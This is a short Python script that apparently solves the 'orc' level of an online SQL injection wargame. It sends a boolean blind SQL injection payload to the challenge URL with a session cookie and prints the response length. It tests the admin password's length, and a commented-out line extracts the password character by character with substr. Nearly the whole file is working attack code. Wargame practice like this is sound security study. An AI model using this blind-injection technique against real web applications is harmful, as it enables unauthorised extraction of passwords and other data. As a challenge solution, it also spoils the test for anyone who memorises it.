#!/usr/bin/python
#-*-coding:utf-8  -*-

import urllib.request

answer = ""

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

payload = "?pw=-1' or id='admin' and length(pw)=8%23".replace(" ","%20")
#payload = "?pw=-1' or id='admin' and substr(pw," + str(j) + ",1)='" + chr(i)

url = url + payload

print(url+"\n\n")

req = urllib.request.Request(url);
req.add_header('User-agent', user_agent)
req.add_header("Cookie", "PHPSESSID=p75tocs5uahbs57tduoduglkjn")

res = urllib.request.urlopen(req)
data = res.read().decode('utf-8')

print(len(data))


